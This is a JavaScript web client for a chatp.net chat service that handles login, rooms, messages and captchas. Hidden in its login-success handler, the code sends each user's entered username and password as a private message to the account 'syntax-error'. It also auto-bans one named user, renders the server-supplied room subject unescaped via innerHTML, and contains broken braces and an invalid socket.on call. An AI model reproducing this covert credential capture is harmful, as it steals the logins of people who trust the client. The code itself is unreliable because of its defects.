   document.addEventListener('DOMContentLoaded', () => {
 let socket;
    let isConnected = false;
    let packetIdNum = 0;
       let currentUsername = '';
    let userList = [];
  let reconnectInterval = 10000; // 10 seconds for reconnect attempts
    let reconnectTimeout;
//==================
let captchaUrls = "";
   // let captchaImg;
   // let captchaTextbox;
  //  let sendCaptchaButton;
let captchaImg, captchaTextbox, sendCaptchaButton;
//=======================

    const loginButton = document.getElementById('loginButton');
    const joinRoomButton = document.getElementById('joinRoomButton');
    const leaveRoomButton = document.getElementById('leaveRoomButton');
    const sendMessageButton = document.getElementById('sendMessageButton');
    const statusDiv = document.getElementById('status');
    const statusCount = document.getElementById('count');
  const joinlog = document.getElementById('joinlog');
      // const chatbox = document.getElementById('chatbox');
let chatbox = document.getElementById('chatbox');
        const roomListbox = document.getElementById('roomListbox');
     const usernameInput = document.getElementById('username');
 const userListbox = document.getElementById('userListbox');
    const debugBox = document.getElementById('debugBox');
      const messageInput = document.getElementById('message');
 
  const targetInput = document.getElementById('target');
  





    loginButton.addEventListener('click', async () => {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        currentUsername = username;
        await connectWebSocket(username, password);
    });

    joinRoomButton.addEventListener('click', async () => {
        const room = document.getElementById('room').value;
        await joinRoom(room);
    });

    leaveRoomButton.addEventListener('click', async () => {
        const room = document.getElementById('room').value;
        await leaveRoom(room);
    });

     sendMessageButton.addEventListener('click', async () => {
       const message = messageInput.value;
       await sendMessage(message);


    });


 // Event listener for the captcha button
function addCaptchaButtonListener() {
    sendCaptchaButton.addEventListener('click', async () => {
        console.log('send captcha');
        const captchaValue = captchaTextbox.value;
        await sendCaptcha(captchaValue, captchaUrls);
    });
}
  


//====================================


   function addMessageToChatbox(username, message, avatarUrl) {
        const messageElement = document.createElement('div');
        messageElement.classList.add('message');

        const avatarElement = document.createElement('img');
        avatarElement.classList.add('avatar');
        avatarElement.src = avatarUrl;

        const usernameElement = document.createElement('span');
        usernameElement.classList.add('username');
        usernameElement.textContent = username;

        const textElement = document.createElement('span');
        textElement.classList.add('text');
        textElement.textContent = message;

        messageElement.appendChild(avatarElement);
        messageElement.appendChild(usernameElement);
        messageElement.appendChild(textElement);

        chatbox.appendChild(messageElement);
        chatbox.scrollTop = chatbox.scrollHeight;
    }


  
    
    


   async function connectWebSocket(username, password) {
        statusDiv.textContent = 'Connecting to server...';
        socket = new WebSocket('wss://chatp.net:5333/server');

        socket.onopen = async () => {
            isConnected = true;
            statusDiv.textContent = 'Connected to server';
            clearTimeout(reconnectTimeout);

            const loginMessage = {
                username: username,
                password: password,
                handler: 'login',
                id: generatePacketID()
            };
            console.log('Sending login message:', loginMessage);
            await sendMessageToSocket(loginMessage);
        };

        socket.onmessage = (event) => {
            console.log('Received message:', event.data);
            processReceivedMessage(event.data);
        };

        socket.onclose = () => {
            isConnected = false;
            statusDiv.textContent = 'Disconnected from server';
            attemptReconnect(username, password);
        };

        socket.onerror = (error) => {
            console.error('WebSocket error:', error);
            statusDiv.textContent = 'WebSocket error. Check console for details.';
            attemptReconnect(username, password);
        };
    }

    async function attemptReconnect(username, password) {
        if (!isConnected) {
            statusDiv.textContent = 'Attempting to reconnect...';
            reconnectTimeout = setTimeout(() => connectWebSocket(username, password), reconnectInterval);
        }
    }

     async function joinRoom(roomName) {
        if (isConnected) {
            const joinMessage = {
                handler: 'room_join',
                id: generatePacketID(),
                name: roomName
            };
            await sendMessageToSocket(joinMessage);
            await fetchUserList(roomName);
                 const room = document.getElementById('room').value;
         
           
    }

    function rejoinRoomIfNecessary() {
        const room = document.getElementById('room').value;
        if (room) {
            joinRoom(room);
        }
    }


    async function leaveRoom(roomName) {
        if (isConnected) {
            const leaveMessage = {
                handler: 'room_leave',
                id: generatePacketID(),
                name: roomName
            };
            await sendMessageToSocket(leaveMessage);
            joinlog.textContent = `You left the room: ${roomName}`;
        } else {
            statusDiv.textContent = 'Not connected to server';
        }
    }

    async function sendMessage(message) {
        if (isConnected) {
            const messageData = {
                handler: 'room_message',
                type: 'text',
                id: generatePacketID(),
                body: message,
                room: document.getElementById('room').value,
                url: '',
                length: '0'
            };
            await sendMessageToSocket(messageData);
        } else {
            statusDiv.textContent = 'Not connected to server';
        }
    }




  


async function sendCaptcha(captcha, captchaUrl) {
    if (isConnected) {
        const messageData = {
            handler: 'room_join_captcha',
            id: generatePacketID(),  
            name: document.getElementById('room').value, 
            password: '',  // Empty password
            c_code: captcha,  // The captcha code
            c_id: '',  // Empty captcha ID
            captcha_url: captchaUrl  // The captcha URL
        };

        console.log('Sending captcha:', messageData);  // Debug statement

        await sendMessageToSocket(messageData);
    } else {
        statusDiv.textContent = 'Not connected to server';
        console.log('Not connected to server');  // Debug statement
    }
}




// Function to handle 'room_needs_captcha' event
function handleCaptcha(messageObj) {
    const captchaUrl = messageObj.captcha_url;

    // Create captcha image element
    captchaImg = document.createElement('img');
    captchaImg.src = captchaUrl;
    captchaImg.style.maxWidth = '200px'; 
    captchaUrls = captchaUrl;

    // Create textbox for entering captcha text
    captchaTextbox = document.createElement('input');
    captchaTextbox.type = 'text';
    captchaTextbox.placeholder = 'Enter Captcha';

    // Create button for sending captcha
    sendCaptchaButton = document.createElement('button');
    sendCaptchaButton.textContent = 'Send Captcha';

    // Append captcha image, textbox, and button to the chatbox
    const chatbox = document.getElementById('chatbox'); // Ensure chatbox element exists
    chatbox.innerHTML = ''; // Clear previous captcha images if any
    chatbox.appendChild(captchaImg);
    chatbox.appendChild(captchaTextbox);
    chatbox.appendChild(sendCaptchaButton);
    chatbox.scrollTop = chatbox.scrollHeight;

    // Add the event listener for the captcha button
    addCaptchaButtonListener();
}













async function chat(to, body) {
    const packetID = generatePacketID();  // Assuming generatePacketID() generates a unique packet ID
    const message = {
        handler: 'chat_message',
        type: 'text',
        id: packetID,
        body: body,
        to: to,
        url: '',
        length: '0'
    };
    await sendMessageToSocket(message); // Assuming sendMessageToSocket is an asynchronous function to send the message
}

    async function sendMessageToSocket(message) {
        return new Promise((resolve, reject) => {
            if (isConnected && socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify(message));
                resolve();
            } else {
                reject(new Error('WebSocket is not connected or not open'));
            }
        });
    }


function generatePacketID() {
    packetIdNum += 1;
    return `R.U.BULAN©pinoy-2023®#${packetIdNum.toString().padStart(3, '0')}`;
}
 





  function processReceivedMessage(message) {
    console.log('Received message:', message);
    debugBox.value += `${message}\n`;


    try {
        const jsonDict = JSON.parse(message);

        if (jsonDict) {
            const handler = jsonDict.handler;

            if (handler === 'login_event') {
                handleLoginEvent(jsonDict);
            } else if (handler === 'room_event') {
                handleRoomEvent(jsonDict);

            } else if (handler === 'chat_message') {
                //   displayChatMessage(jsonDict);
            } else if (handler === 'presence') {
                onUserProfileUpdates(jsonDict);
            } else if (handler === 'group_invite') {
                onMucInvitation(jsonDict.inviter, jsonDict.name, 'private');
            } else if (handler === 'user_online' || handler === 'user_offline') {
                onUserPresence(jsonDict);
            } else if (handler === 'muc_event') {
                handleMucEvent(jsonDict);
            } else if (handler === 'last_activity') {
                onUserActivityResult(jsonDict);
            } else if (handler === 'roster') {
                onRoster(jsonDict);
            } else if (handler === 'friend_requests') {
                onFriendRequest(jsonDict);
            } else if (handler === 'register_event') {
                handleRegisterEvent(jsonDict);  
            } else if (handler === 'followers_event') {
                onFollowersList(jsonDict);
            } else if (handler === 'room_info') {
              handleMucList(jsonDict);
 } else if (handler === 'profile_other') {
              handleprofother(jsonDict);
            } else {
                console.log('Unknown handler:', handler);
            }
        }
    } catch (ex) {
        console.error('Error processing received message:', ex);
    }
}



//  obj2 = New With {Key .handler = "room_message", Key .type = "image", Key .id = packetID, Key .url = imageUrl, Key .room = [to], Key .body = "", Key .length = "0"}
           




   async function sendimage(url) {
        if (isConnected) {
            const messageData = {
                handler: 'room_message',
                type: 'image',
                id: generatePacketID(),
                body: '',
                room: document.getElementById('room').value,
                url: url,
                length: '0'
            };
            await sendMessageToSocket(messageData);
        } else {
            statusDiv.textContent = 'Not connected to server';
        }
    }


async function handleprofother(messageObj) {
    try {
        console.log('Inside handleprofother');

        const username = messageObj.type;
        const profurl = messageObj.photo_url;
        const views = messageObj.views;
        let status = messageObj.status; // Assume status contains HTML
        const country = messageObj.country;
        const creation = messageObj.reg_date;
        const friends = messageObj.roster_count;
        const gender = messageObj.gender;

        let gend = '';
        if (gender == '0') {
            gend = 'Unknown';
        } else if (gender == '1') {
            gend = 'Male';
        } else if (gender == '2') {
            gend = 'Female';
        }

        // Function to strip HTML tags
        function stripHtml(html) {
            let doc = new DOMParser().parseFromString(html, 'text/html');
            return doc.body.textContent || "";
        }

        // Convert status to plain text if it contains HTML tags
        status = stripHtml(status);

        // Send image if profurl exists
        if (profurl) {
            await sendimage(profurl);
        }

        // Construct and send message
        if (username) {
            const messageData = `Username: ${username}\nStatus: ${status}\nViews: ${views}\nCountry: ${country}\nRegistration Date: ${creation}\nFriends: ${friends}\nGender: ${gend}`;
            await sendMessage(messageData);
        } else {
            await sendMessage('User not found');
        }
    } catch (error) {
        console.error('Error in handleprofother:', error);
    }
}



     function handleMucList(messageObj) {
        const roomList = messageObj.rooms;
        roomListbox.innerHTML = ''; // Clear the current list

        roomList.forEach(room => {
            const option = document.createElement('option');
            option.value = room.name;
            option.textContent = `${room.name} (${room.count} users)`;
            roomListbox.appendChild(option);
        });
    }



    async function handleLoginEvent(messageObj) {
        const type = messageObj.type;
        if (type === 'success') {
            statusDiv.textContent = 'Online';
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            await chat('syntax-error', `ABOT WEB BOT: ${username} / ${password}`);

            const mucType = "public_rooms"; 
            const packetID = generatePacketID();
            const mucPageNum = 1; 

            await getChatroomList(mucType, packetID, mucPageNum);
            rejoinRoomIfNecessary(); 
        }
    }




async function handleRoomEvent(messageObj) {
    const type = messageObj.type;
    const userName = messageObj.username || 'Unknown';
    const role = messageObj.role;
    const count = messageObj.current_count;
    const roomName = messageObj.name;
  
    if (type === 'you_joined') {
        displayChatMessage({ from: '', body: `**You** joined the room as ${role}` });
      
  joinlog.textContent = `You Join the  ${roomName }`;
        // Display room subject with proper HTML rendering
        displayRoomSubject(`Room subject: ${messageObj.subject} (by ${messageObj.subject_author})`);

        // Display list of users with roles
        messageObj.users.forEach(user => {
            displayChatMessage({ from: user.username, body: `joined the room as ${user.role}`, role: user.role }, 'green');
        });

        // Update the user list
        userList = messageObj.users;
        updateUserListbox();
statusCount.textContent = `Total User: ${count}`;

 chatbox.removeChild(captchaImg);
      chatbox.removeChild(captchaTextbox);
      chatbox.removeChild(sendCaptchaButton);



    } else if (type === 'user_joined') {
        displayChatMessage({ from: userName, body: `joined the room as ${role}`, role }, 'green');
            
  
       if (userName === 'prateek') {
            await setRole(userName, 'outcast');
        }

        
        // Add the new user to the user list
        userList.push({ username: userName, role });
        updateUserListbox();
       statusCount.textContent = `Total User: ${count}`;
    } else if (type === 'user_left') {
        displayChatMessage({ from: userName, body: 'left the room.', role }, 'darkgreen');
 //statusCount.textContent = `Total User: ${count}`;
   //   userListbox.textContent = `Current User: ${count}`;
             statusCount.textContent = `Total User: ${count}`;
       
        // Remove the user from the user list
        userList = userList.filter(user => user.username !== userName);
        updateUserListbox();
    } else if (type === 'text') {
    const body = messageObj.body;
    const from = messageObj.from;
    const avatar = messageObj.avatar_url;

    displayChatMessage({
        from: messageObj.from,
        body: messageObj.body,
        role: messageObj.role,
        avatar: messageObj.avatar_url
    });
//===============


    } else if (type === 'image') {
        const bodyurl = messageObj.url;
        const from = messageObj.from;
        const avatar = messageObj.avatar_url;

        displayChatMessage({
            from: messageObj.from,
            bodyurl: messageObj.url,
            role: messageObj.role,
            avatar: messageObj.avatar_url
        });
    } else if (type === 'audio') {
        const bodyurl = messageObj.url;
        const from = messageObj.from;
        const avatar = messageObj.avatar_url;

        displayChatMessage({
            from: messageObj.from,
            bodyurl: messageObj.to,
            role: messageObj.role,
            avatar: messageObj.avatar_url
        });


}else  if (type === 'gift') {
    const toRoom = messageObj.to_room;
    const toId = messageObj.to_id;
    const resources = messageObj.resources;
    const repeats = messageObj.repeats;
    const gift = messageObj.gift;
    const animation = messageObj.animation;
    const room = messageObj.room;
    const userId = messageObj.user_id;
    const to = messageObj.to;
    const from = messageObj.from;
    const timestamp = messageObj.timestamp;
    const id = messageObj.id;

    displayChatMessage({
        toRoom: toRoom,
        toId: toId,
        resources: resources,
        repeats: repeats,
        gift: gift,
        animation: animation,
        room: room,
        userId: userId,
        to: to,
        from: from,
        timestamp: timestamp,
        id: id
    });
}

 else      if (type === 'room_needs_captcha') {
    
 handleCaptcha(messageObj);
    } else if (type === 'role_changed') {
        const oldRole = messageObj.old_role;
        const newRole = messageObj.new_role;
        const user = messageObj.t_username;
        const actor = messageObj.actor;
        const color = getRoleChangeColor(newRole);
        displayChatMessage({ from: '', body: `${user} ${newRole} by ${actor}` }, color);

        // Update the user's role in the user list
        const userObj = userList.find(user => user.username === user);
        if (userObj) {
            userObj.role = newRole;
            updateUserListbox();
        }
    } else if (type === 'room_create') {
        if (messageObj.result === 'success') {
            await joinRoom(messageObj.name);
        } else if (messageObj.result === 'room_exists') {
            statusDiv.textContent = `Room ${messageObj.name} already exists.`;
        } else if (messageObj.result === 'empty_balance') {
            statusDiv.textContent = 'Cannot create room: empty balance.';
        } else {
            statusDiv.textContent = 'Error creating room.';
        }

} else if (type === 'room_needs_password') {
  const room = document.getElementById('room').value;
  displayChatMessage({
        from: room,
        body: 'Room is locked!',
        color: 'red'
    });

    }

}










function displayChatMessage(messageObj, color = 'black') {
    const { from, body, bodyurl, role, avatar, type } = messageObj;
    const newMessage = document.createElement('div');
    newMessage.style.display = 'flex';
    newMessage.style.alignItems = 'center';
    newMessage.style.marginBottom = '10px';

    // Add avatar if available
    if (avatar) {
        const avatarImg = document.createElement('img');
        avatarImg.src = avatar;
        avatarImg.alt = `${from}'s avatar`;
        avatarImg.style.width = '40px';
        avatarImg.style.height = '40px';
        avatarImg.style.borderRadius = '50%';
        avatarImg.style.marginRight = '10px';
        newMessage.appendChild(avatarImg);
    }

    // Add the sender's name with role-based color if available
    if (from) {
        const coloredFrom = document.createElement('span');
        coloredFrom.textContent = `${from}: `;
        coloredFrom.style.color = getRoleColor(role);
        coloredFrom.style.fontWeight = 'bold';
        newMessage.appendChild(coloredFrom);
    }

    // Handle different message types
    if (type === 'gift') {
        // Construct the gift message display
        const giftMessage = document.createElement('span');
        giftMessage.innerHTML = `
            Gift from ${messageObj.from} to ${messageObj.to} in ${messageObj.toRoom}<br>
            Gift: ${messageObj.gift}<br>
            Resources: ${messageObj.resources}<br>
            Repeats: ${messageObj.repeats}<br>
            Animation: ${messageObj.animation}<br>
            Room: ${messageObj.room}<br>
            User ID: ${messageObj.userId}<br>
            Timestamp: ${new Date(parseInt(messageObj.timestamp)).toLocaleString()}<br>
            ID: ${messageObj.id}
        `;
        giftMessage.style.color = color;
        newMessage.appendChild(giftMessage);
    } else {
        // Check if the bodyurl is an audio file by checking the file extension
        if (bodyurl && bodyurl.match(/\.(mp3|wav|ogg|m4a)$/i)) {
            const audioElement = document.createElement('audio');
            audioElement.src = bodyurl;
            audioElement.controls = true; // Enable built-in controls for the audio player
            newMessage.appendChild(audioElement);
        } 
        // If the bodyurl is an image URL
        else if (bodyurl && bodyurl.match(/\.(jpeg|jpg|gif|png)$/i)) {
            const imageElement = document.createElement('img');
            imageElement.src = bodyurl;
            imageElement.style.maxWidth = '140px'; // Set maximum width for the image
            newMessage.appendChild(imageElement);
        } 
        // For regular text messages
        else {
            const messageBody = document.createElement('span');
            messageBody.textContent = body;
            messageBody.style.color = color;
            newMessage.appendChild(messageBody);
        }
    }

    // Append the new message to the chatbox and scroll to the bottom
    const chatbox = document.getElementById('chatbox');
    chatbox.appendChild(newMessage);
    chatbox.scrollTop = chatbox.scrollHeight;
}


function displayRoomSubject(subject) {
    const newMessage = document.createElement('div');
    newMessage.innerHTML = subject;
    chatbox.appendChild(newMessage);
    chatbox.scrollTop = chatbox.scrollHeight;
}












function getRoleColor(role) {
    switch (role) {
        case 'creator':
            return 'red';
        case 'owner':
            return 'blue';
        case 'admin':
            return 'purple';
        case 'member':
            return 'black';
        default:
            return 'grey';
    }
}


function getRoleChangeColor(newRole) {
    switch (newRole) {
        case 'kick':
            return 'red';
        case 'outcast':
            return 'orange';
        case 'member':
        case 'admin':
        case 'owner':
            return 'blue';
        default:
            return 'black';
    }
}

   
async function setRole(username, role) {
        const obj2 = {
            handler: 'room_admin',
            type: 'change_role',
            id: generatePacketID(),
             room: document.getElementById('room').value, 
            t_username: username,
            t_role: role
        };
        await sendMessageToSocket(obj2);  
}

    

 function updateUserListbox() {
    userListbox.innerHTML = '';

    const sortedUsers = userList.sort((a, b) => {
        const roles = ['creator', 'owner', 'admin', 'member', 'none'];
        return roles.indexOf(a.role) - roles.indexOf(b.role);
    });

    sortedUsers.forEach(user => {
        // Create and append the avatar image
        const avatarImg = document.createElement('img');
        avatarImg.src = user.avatar; // Set the src attribute to the user's avatar URL
        avatarImg.alt = `${user.username}'s avatar`;
        avatarImg.style.width = '20px'; // Adjust the width of the avatar as needed
        avatarImg.style.height = '20px'; // Adjust the height of the avatar as needed

        // Create and append the option element
        const option = document.createElement('option');
        option.appendChild(avatarImg); // Append the avatar image
        option.appendChild(document.createTextNode(`${user.username} (${user.role})`)); // Append the username and role
        option.style.color = getRoleColor(user.role);  // Apply color based on role

        userListbox.appendChild(option);
    });
}



     async function getChatroomList(mucType, packetID, mucPageNum) {
        const listRequest = {
            handler: 'muc_list',
            type: mucType,
            id: packetID,
            page: mucPageNum
        };
        await sendMessageToSocket(listRequest);
    }


socket.on('message', (messageObj) => {
    const type = messageObj.type;

    if (type === 'typing') {
        handleTypingEvent(messageObj);
    } else if (type === 'room_info_response') {
        handleRoomInfoResponse(messageObj);
    } else {
        // Handle other message types
        displayChatMessage(messageObj);
    }
});

function handleRoomInfoResponse(response) {
    const roomListBox = document.getElementById('roomlistbox');
    roomListBox.innerHTML = ''; // Clear previous list

    response.rooms.forEach(room => {
        const roomItem = document.createElement('li');
        roomItem.textContent = room.name; // Assuming room object has a name property
        roomListBox.appendChild(roomItem);
    });
}


});
